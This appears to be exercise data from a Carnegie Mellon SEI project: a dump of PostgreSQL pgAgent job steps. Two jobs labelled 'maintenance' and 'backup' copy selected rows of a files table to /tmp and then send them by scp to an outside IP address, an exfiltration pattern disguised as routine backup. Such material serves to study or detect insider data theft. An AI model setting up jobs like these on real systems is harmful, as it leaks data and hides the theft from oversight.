-- Copyright 2024 Carnegie Mellon University.
-- Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
-- root or contact permission@sei.cmu.edu for full terms.

jstid | jstjobid |   jstname   | jstdesc | jstenabled | jstkind |                                              jstcode                                              | jstconnstr | jstdbname | jstonerror | jscnextrun 
-------+----------+-------------+---------+------------+---------+---------------------------------------------------------------------------------------------------+------------+-----------+------------+------------
     2 |        2 | maintenance |         | t          | s       | COPY (select * from public.files where id in (1648, 242, 1237, 480, 534)) TO '/tmp/pgbkp/db.bak'; |            | postgres  | f          | 
     3 |        3 | backup      |         | t          | b       | #!/bin/bash                                                                                      +|            |           | f          | 
       |          |             |         |            |         | mkdir /tmp/pgbkp                                                                                 +|            |           |            | 
       |          |             |         |            |         | scp /tmp/pgbkp/db.bak user@123.45.67.192:Desktop/                                                 |            |           |            |